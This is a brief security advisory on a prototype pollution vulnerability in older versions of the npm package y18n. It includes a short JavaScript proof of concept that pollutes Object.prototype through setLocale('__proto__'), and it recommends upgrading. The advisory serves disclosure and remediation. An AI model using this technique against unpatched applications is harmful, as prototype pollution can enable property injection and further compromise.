summary: "Prototype Pollution in y18n\n### Overview\n\nThe npm package `y18n` before versions\
  \ 3.2.2, 4.0.1, and 5.0.5 is vulnerable to Prototype Pollution. \n\n### POC\n\n```js\nconst\
  \ y18n = require('y18n')();\n\ny18n.setLocale('__proto__');\ny18n.updateLocale({polluted:\
  \ true});\n\nconsole.log(polluted); // true\n```\n\n### Recommendation\n\nUpgrade to version\
  \ 3.2.2, 4.0.1, 5.0.5 or later."
